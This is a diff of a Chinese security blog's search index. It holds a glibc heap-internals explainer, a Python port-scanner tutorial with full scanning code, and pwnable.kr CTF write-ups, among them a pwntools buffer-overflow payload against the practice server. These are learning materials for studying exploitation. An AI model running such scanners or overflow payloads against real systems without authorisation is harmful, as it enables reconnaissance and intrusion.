-<p>对于每个加入该进程的新线程，堆管理器将先查找没有被其他线程在使用的*“arenas”<em>，并将该</em>“arenas”<em>附加到该线程。一旦所有可用的</em>“arenas”<em>都是在其它线程使用中，堆管理器将<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l872">创建一个新的</a></em>“arenas”<em>，直到</em>“arenas”<em>的数目达到最大（32位进程为CPU核心数的2倍、64位进程位CPU核心的8倍）。一旦最终达到该限制，堆管理器就会放弃分配，这样多个线程将必须共享一个</em>“arenas”*，即执行堆操作将需要那些线程中的一个等待另一个线程。</p>
-<p>但是这些二级*“arenas”<em>如何工作？我们看到，主堆在程序加载到内存的紧邻其后的位置，并使用</em>brk<em>系统调用对其进行扩展开始工作，但二级</em>“arenas”<em>并不相同，这些二级</em>“arenas”<em>使用</em>mmap<em>和</em>mprotect*创建的一个或多个“<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/arena.c;h=efca2bcf682667c618e285b2357888d10d336c5f;hb=HEAD#l452">子堆</a>”来模拟主堆的行为。</p>
-<h3 id="subheaps"><a class="markdownIt-Anchor" href="#subheaps"></a> <strong>SUBHEAPS</strong></h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/6.png" class></strong></p>
-<p>子堆的工作方式与初始程序堆基本相同，主要存在两个区别。初始堆位于程序加载到内存之后的紧邻其后的位置，并且由<em>sbrk</em>动态扩展。相比之下，每个子堆使用<em>mmap</em>定位到内存中，堆管理器使用<em>mprotect</em>手动模拟增长子堆。</p>
-<p>当堆管理器想要创建子堆时，它首先通过调用<em>mmap</em>要求内核保留该子堆可能增长到的内存区域*。*保留该区域不会将内存直接分配到子堆中；它只是要求内核不要在该区域内分配诸如线程堆栈，mmap区域或者其它的分配任务。*默认情况下，子堆大小最大（即保留该子堆使用的内存区域）在32位上为1MB，在64位系统上为64MB。</p>
-<p>这是通过<em>mmap</em>询问标记为<em>PROT_NONE</em>的页面来完成的，这表明内核仅需要为该区域保留地址范围，不需要内核将内存直接分配给它。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/7.png" class></strong></p>
-<p>在使用<em>sbrk</em>增长初始堆的地方，堆管理器通过手动调用<a href="http://man7.org/linux/man-pages/man2/mprotect.2.html"><em>mprotect</em></a>将区域中的页面从<em>PROT_NONE</em>更改为<em>PROT_READ | PROT_WRITE</em>来将子堆“增长”到此保留的地址范围。这导致内核将物理内存附加到那些地址，实际上也会导致子堆缓慢增长，直到整个<em>mmap</em>区域已满。一旦整个子堆都用完，<em>arenas</em>便会分配另一个子堆。这将允许二级*”arenas”*几乎无限期地保持增长，直到内核耗尽内存或进程耗尽地址空间时才会失败。</p>
-<h4 id="recap"><a class="markdownIt-Anchor" href="#recap"></a> Recap：</h4>
-<p>初始（“main”）<em>arena</em>仅包含主堆，该主堆位于将程序二进制文件加载到内存之后的位置，并使用<em>sbrk</em>进行扩展。这是用于单线程应用程序的唯一<em>arena</em>。在多线程应用程序上，为新线程分配了二级<em>arena</em>，从中可以分配这些二级<em>arena</em>。使用<em>arenas</em>可以降低线程在执行堆操作之前需要等待互斥锁的可能性，从而提高了程序的速度。与<em>main arena</em>不同，这些二级<em>arena</em>从一个或多个子堆中分配块，这些子堆在内存中的位置首先使用<em>mmap</em>进行确定，并通过使用<em>mprotect</em>进行扩展。</p>
-<h3 id="chunk-metadata"><a class="markdownIt-Anchor" href="#chunk-metadata"></a> <strong>CHUNK METADATA</strong></h3>
-<p>现在，了解了分配块的所有不同方式，这些块不仅包含提供给程序员的“用户数据”区域（作为<em>malloc</em>的返回值），同时包含元数据。下面介绍元数据实际记录的值以及存放的位置。</p>
-<p>块的元数据在内存中的<a href="https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=6e766d11bc85b6480fa5c9f2a76559f8acf9deb5;hb=HEAD#l1038">确切布局</a>可能会很混乱，因为堆管理器源代码将一个块末尾的元数据与下一个块末尾的元数据组合在一起，并且几个存在并被使用的元数据字段取决于不同种类的chunk。</p>
-<p>现在，我们仅看一下实时分配，它具有单个<em>size_t</em> * 标头，该标头位于给程序员的“用户数据”区域的后面。此字段（在源代码中称为<em>mchunk_size</em>）是在<em>malloc</em>期间写入的，之后由<em>free</em>决定如何处理该分配空间的释放。</p>
-<p>* size_t值在32位系统上为4字节整数，在64位系统上为8字节整数。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/8.png" class></strong></p>
-<p>该<em>mchunk_size</em>存储了四种信息：块的大小，以及被称为“A”,“M”和“P”三比特位。这些都被存储在相同的<em>size_t</em>字段中，因为块大小始终是8字节对齐的（在64位上是16字节对齐），因此，块大小的低三位始终为零。</p>
-<p><strong>“ A ”标志</strong>是用来告诉堆管理器，是否该块属于二级<em>arena</em>，而不是在<em>main arena</em>。在free期间，堆管理器仅仅给了一个指向程序员想要释放空间的指针，并且堆管理器需要确定该指针属于哪一个<em>arena</em>。如果在块的元数据中A标志被设置，则堆管理器必须搜索每个<em>arena</em>，并查看指针是否位于该<em>arena</em>的任何子堆中。如果未设置该标志，则堆管理器可以减少搜索，因为它知道该块来自初始的<em>arena</em>。</p>
-<p><strong>“ M ”标志</strong>用于指示该块是一个通过<em>mmap</em>进行堆外分配的巨大分配。当此分配空间最终返回给<em>free时</em>，堆管理器将通过<em>munmap</em>立即将整个块返回给操作系统，而不是尝试对其进行回收。因此，空闲即已经被释放的块永远不会设置该标志位。</p>
-<p><strong>“ P ”标志</strong>令人困惑，因为它实际上属于先前的块。它指示先前的块是一个空闲块。这意味着当这个块被释放时，可以将其安全地连接到先前的块上，以创建更大的空闲块。</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/16/Heap/Heap-I/9.gif" class></strong></p>
-<p>下面是一些和堆相关的文章：</p>
-<ul>
-<li><a href="http://phrack.org/issues/57/9.html">Once upon a free()</a></li>
-<li><a href="http://phrack.org/issues/66/10.html">Malloc des-maleficarum</a></li>
-<li><a href="http://phrack.org/issues/67/8.html">The house of lore</a></li>
-<li><a href="http://phrack.org/issues/61/6.html">Advanced Doug Lea’s malloc exploits</a></li>
-<li><a href="http://phrack.org/issues/66/6.html">Yet another free() exploitation technique</a></li>
-</ul>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Heap</category>
-        <category>Heap_Basic</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>python实现端口扫描器</title>
-    <url>/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/0.png" class></strong></p>
- <a id="more"></a>
-<h3 id="实现原理"><a class="markdownIt-Anchor" href="#实现原理"></a> 实现原理</h3>
-<p>最简单的端口扫描工具使用TCP连接扫描的方式，即利用操作系统原生的网络功能，且通常作为SYN扫描的替代选项。Nmap将这种模式称为连接扫描，因为使用了类似Unix系统的connect()命令。如果该端口是开放的，操作系统就能完成TCP三次握手，然后端口扫描工具会立即关闭刚建立的连接，防止拒绝服务攻击。这种端口扫描模式的优势是用户无需特殊权限。但使用操作系统原生网络功能不能实现底层控制，因此这种扫描方式并不流行。并且TCP扫描很容易被发现，尤其作为端口清扫的手段：这些服务会记录发送者的 IP 地址，入侵检测系统可能触发警报。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>（<a href="https://xz.aliyun.com/t/5376#toc-0">端口扫描类型</a>）</p>
-<p>还有另外一种扫描方式是 SYN 扫描，端口扫描工具不使用操作系统原生网络功能，而是自行生成、发送 IP 数据包，并监控其回应。这种扫描模式被称为 “半开放扫描”，因为它从不建立完整的 TCP 连接。端口扫描工具生成一个 SYN 包，如果目标端口开放，则会返回 SYN-ACK 包。扫描端回应一个 RST 包，然后在握手完成前关闭连接。如果端口关闭了但未使用过滤，目标端口应该会持续返回 RST 包。这种粗略的网络利用方式有几个优点：给扫描工具全权控制数据包发送和等待回应时长的权力，允许更详细的回应分析。关于哪一种对目标主机的扫描方式更不具备入侵性存在一些争议，但 SYN 扫描的优势是从不会建立完整的连接。然而，RST 包可能导致网络堵塞，尤其是一些简单如打印机之类的网络设备。</p>
-<p>实例中采用的是第一种扫描方式，直接利用操作系统的 socket 连接接口，初步测试目标服务器的端口是否可以连接，如果可以则返回端口打开状态。<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>−</mo><mo>−</mo><mo>&gt;</mo></mrow><annotation encoding="application/x-tex">--&gt;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span></span></span></span>（<a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71">socket编程基础</a>）</p>
-<h3 id="实现单线程扫描功能"><a class="markdownIt-Anchor" href="#实现单线程扫描功能"></a> 实现单线程扫描功能</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实现从程序外部向程序传递参数</span></span><br><span class="line">host = sys.argv[<span class="number">1</span>]</span><br><span class="line">portstrs = sys.argv[<span class="number">2</span>].split(<span class="string">&#x27;-&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 扫描端口范围</span></span><br><span class="line">start_port = int(portstrs[<span class="number">0</span>])</span><br><span class="line">end_port = int(portstrs[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取目标ip地址</span></span><br><span class="line">target_ip = gethostbyname(host)</span><br><span class="line">opened_ports = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># 进行循环连接</span></span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(start_port, end_port):</span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">10</span>)</span><br><span class="line">    result = sock.connect_ex((target_ip, port))</span><br><span class="line">    <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">        opened_ports.append(port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印开放的端口</span></span><br><span class="line">print(<span class="string">&quot;Opened ports:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> opened_ports:</span><br><span class="line">    print(i)</span><br></pre></td></tr></table></figure>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/2.png" class></strong></p>
-<p>上面代码实现了单线程扫描端口的测试，但是正常的程序在执行中我们需要考虑执行效率和提升性能，所以需要实现多线程程序。</p>
-<h3 id="多线程扫描"><a class="markdownIt-Anchor" href="#多线程扫描"></a> 多线程扫描</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line">monkey.patch_all()</span><br><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> gevent.pool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">TCP_connect</span>(<span class="params">ip, port</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;模拟TCP连接&quot;&quot;&quot;</span></span><br><span class="line">    TCP_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    TCP_sock.settimeout(<span class="number">0.5</span>)  <span class="comment"># 设置连接超时</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = TCP_sock.connect_ex((ip, int(port)))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">&quot;[*]%s 端口 开启\t&quot;</span> % port)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># print(&quot;[!]%s端口 关闭&quot;%port)</span></span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        TCP_sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]错误:&quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_ip</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标IP&quot;&quot;&quot;</span></span><br><span class="line">    ip = input(<span class="string">&quot;[+]输入扫描目标IP:&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;[*]正在扫描&quot;</span>)</span><br><span class="line">    scan_port(ip)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_web</span>():</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描目标网址&quot;&quot;&quot;</span></span><br><span class="line">    web = input(<span class="string">&quot;[+]输入扫描网址:&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;http://&quot;</span> <span class="keyword">in</span> web <span class="keyword">or</span> <span class="string">&quot;https://&quot;</span> <span class="keyword">in</span> web:</span><br><span class="line">        web = web[web.find(<span class="string">&#x27;://&#x27;</span>) + <span class="number">3</span>:]</span><br><span class="line">        print(web)</span><br><span class="line">        print(<span class="string">&quot;[*]正在分析网站服务器IP&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server_ip = socket.gethostbyname(str(web))</span><br><span class="line">        print(<span class="string">&quot;[*]服务器IP为%s&quot;</span> % server_ip)</span><br><span class="line">        scan_port(server_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(<span class="string">&quot;[!]服务器IP获取失败&quot;</span>)</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_port</span>(<span class="params">ip</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;扫描端口&quot;&quot;&quot;</span></span><br><span class="line">    print(<span class="string">&quot;[*]开始扫描目标端口&quot;</span>)</span><br><span class="line">    start = time.time()</span><br><span class="line">    g = gevent.pool.Pool(<span class="number">50</span>)  <span class="comment"># 设置线程数</span></span><br><span class="line">    run_list = []</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">65535</span>):</span><br><span class="line">        run_list.append(g.spawn(TCP_connect, ip, port))</span><br><span class="line">    gevent.joinall(run_list)</span><br><span class="line">    end = time.time()</span><br><span class="line">    print(<span class="string">&quot;[*]总耗时%s&quot;</span> % time.strftime(<span class="string">&quot;%H:%M:%S&quot;</span>, time.gmtime(end - start)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    print(<span class="string">&quot;1.通过IP扫描端口&quot;</span>)</span><br><span class="line">    print(<span class="string">&quot;2.通过网址扫描端口&quot;</span>)</span><br><span class="line">    uc = int(input(<span class="string">&quot;[+]请输入选择:&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="number">1</span> == uc:</span><br><span class="line">        scan_ip()</span><br><span class="line">    <span class="keyword">elif</span> <span class="number">2</span> == uc:</span><br><span class="line">        scan_web()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;[!]输入有误&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-<p>这里展示部分运行结果：</p>
-<h4 id="选择通过网址扫描端口"><a class="markdownIt-Anchor" href="#选择通过网址扫描端口"></a> 选择通过网址扫描端口</h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/3.png" class></strong></p>
-<h4 id="选择通过ip扫描端口"><a class="markdownIt-Anchor" href="#选择通过ip扫描端口"></a> 选择通过IP扫描端口</h4>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/4.png" class></strong></p>
-<h3 id="使用nmap扫描"><a class="markdownIt-Anchor" href="#使用nmap扫描"></a> 使用nmap扫描</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> nmap</span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;192.168.56.1&#x27;</span></span><br><span class="line"><span class="comment"># 把nmap.exe的路径放入PortScanner中，否则会有环境变量错误</span></span><br><span class="line">nm = nmap.PortScanner(nmap_search_path=(<span class="string">&#x27;nmap&#x27;</span>, <span class="string">r&quot;E:\nmap\nmap.exe&quot;</span>))</span><br><span class="line"><span class="keyword">for</span> port <span class="keyword">in</span> range(<span class="number">130</span>, <span class="number">136</span>):</span><br><span class="line">    result = nm.scan(host, str(port))</span><br><span class="line">    <span class="comment"># 在主机192.168.56.1上获取端口22/tcp状态</span></span><br><span class="line">    state = result[<span class="string">&#x27;scan&#x27;</span>][<span class="string">&#x27;192.168.56.1&#x27;</span>][<span class="string">&#x27;tcp&#x27;</span>][int(port)][<span class="string">&#x27;state&#x27;</span>]</span><br><span class="line">    print(<span class="string">&#x27;[%s] port state: %s&#x27;</span> % (port, state))</span><br></pre></td></tr></table></figure>
-<p>使用<strong>netstat -an</strong>查看本机开启的端口服务，用端口135测试代码运行的正确性</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/1.png" class></strong></p>
-<p>也可以直接使用zenmap工具进行端口扫描：</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/24/Python/python%E5%AE%9E%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E5%99%A8/5.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>Python</category>
-        <category>Web</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
-        <tag>Nmap</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>blackjack</title>
     <url>/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/19/Pwnable_kr/blackjack/0.png" class></strong></p>
@@ -278,6 +80,29 @@ b） ptr 指向的堆内存可由用户控制</p>
       </tags>
   </entry>
   <entry>
+    <title>bof</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
+ <a id="more"></a>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
+<h3 id="查看给出的c语言源代码"><a class="markdownIt-Anchor" href="#查看给出的c语言源代码"></a> 查看给出的c语言源代码</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
+<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
+<h3 id="ida32打开文件"><a class="markdownIt-Anchor" href="#ida32打开文件"></a> IDA32打开文件</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
+<h3 id="编写python脚本"><a class="markdownIt-Anchor" href="#编写python脚本"></a> 编写python脚本</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>blukat</title>
     <url>/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/0.png" class></strong></p>
@@ -292,29 +117,6 @@ b） ptr 指向的堆内存可由用户控制</p>
 <p>这里看到password文件的用户组含有blukat_pwn，而当前用户在blukat_pwn组，因此是具有读权限的，那运行cat命令：</p>
 <p>提示没有访问权限？不，这里的文件内容就是这句话，那直接将这句话输入到可执行文件中即可拿到flag。</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/22/Pwnable_kr/blukat/3.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bof</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/4.png" class></strong></p>
- <a id="more"></a>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/1.png" class></strong></p>
-<h3 id="查看给出的c语言源代码"><a class="markdownIt-Anchor" href="#查看给出的c语言源代码"></a> 查看给出的c语言源代码</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/2.png" class></strong></p>
-<p>显然，简单的缓冲区溢出，将key通过缓冲区溢出覆盖为0xcafebabe，即可通过判断条件，执行system函数。</p>
-<h3 id="ida32打开文件"><a class="markdownIt-Anchor" href="#ida32打开文件"></a> IDA32打开文件</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/bof/3.png" class></strong></p>
-<h3 id="编写python脚本"><a class="markdownIt-Anchor" href="#编写python脚本"></a> 编写python脚本</h3>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x2C</span> + <span class="string">&#x27;junk&#x27;</span> + <span class="string">&#x27;junk&#x27;</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -439,30 +241,6 @@ b） ptr 指向的堆内存可由用户控制</p>
       </tags>
   </entry>
   <entry>
-    <title>flag</title>
-    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
-    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
- <a id="more"></a>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
-<h3 id="checksec查看文件属性"><a class="markdownIt-Anchor" href="#checksec查看文件属性"></a> checksec查看文件属性</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
-<h3 id="windows下使用upx-d命令解压缩"><a class="markdownIt-Anchor" href="#windows下使用upx-d命令解压缩"></a> windows下使用upx -d命令解压缩</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
-<h3 id="ida64打开解压缩的文件"><a class="markdownIt-Anchor" href="#ida64打开解压缩的文件"></a> IDA64打开解压缩的文件</h3>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
-<p>将flag的值存放到dest中，直接查看flag即可</p>
-<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
-]]></content>
-      <categories>
-        <category>PWN</category>
-        <category>Pwnable.kr</category>
-        <category>Toddler&#39;s Bottle</category>
-      </categories>
-      <tags>
-        <tag>PWN</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>fd</title>
     <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/</url>
     <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/1.png" class></strong></p>
@@ -488,6 +266,30 @@ b） ptr 指向的堆内存可由用户控制</p>
 <p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/fd/7.png" class></strong></p>
 <p>注意这里参数需要转为10进制   <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mn>0</mn><mi>x</mi><mn>123</mn><msub><mn>4</mn><mn>16</mn></msub><mo>=</mo><mn>466</mn><msub><mn>0</mn><mn>10</mn></msub></mrow><annotation encoding="application/x-tex">0x1234_{16} = 4660_{10}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">0</span><span class="mord mathdefault">x</span><span class="mord">1</span><span class="mord">2</span><span class="mord">3</span><span class="mord"><span class="mord">4</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.79444em;vertical-align:-0.15em;"></span><span class="mord">4</span><span class="mord">6</span><span class="mord">6</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span></p>
 <figure class="highlight erlang-repl"><table><tr><td class="code"><pre><span class="line">flag: mommy! I think I know what a file descriptor is!!</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>PWN</category>
+        <category>Pwnable.kr</category>
+        <category>Toddler&#39;s Bottle</category>
+      </categories>
+      <tags>
+        <tag>PWN</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>flag</title>
+    <url>/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/</url>
+    <content><![CDATA[<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/1.png" class></strong></p>
+ <a id="more"></a>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/2.png" class></strong></p>
+<h3 id="checksec查看文件属性"><a class="markdownIt-Anchor" href="#checksec查看文件属性"></a> checksec查看文件属性</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/3.png" class></strong></p>
+<h3 id="windows下使用upx-d命令解压缩"><a class="markdownIt-Anchor" href="#windows下使用upx-d命令解压缩"></a> windows下使用upx -d命令解压缩</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/4.png" class></strong></p>
+<h3 id="ida64打开解压缩的文件"><a class="markdownIt-Anchor" href="#ida64打开解压缩的文件"></a> IDA64打开解压缩的文件</h3>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/5.png" class></strong></p>
+<p>将flag的值存放到dest中，直接查看flag即可</p>
+<p><strong><img src="/xiaohong404.github.io/2020/10/15/Pwnable_kr/flag/6.png" class></strong></p>
 ]]></content>
       <categories>
         <category>PWN</category>
@@ -597,6 +399,74 @@ b） ptr 指向的堆内存可由用户控制</p>
       </tags>
   </entry>
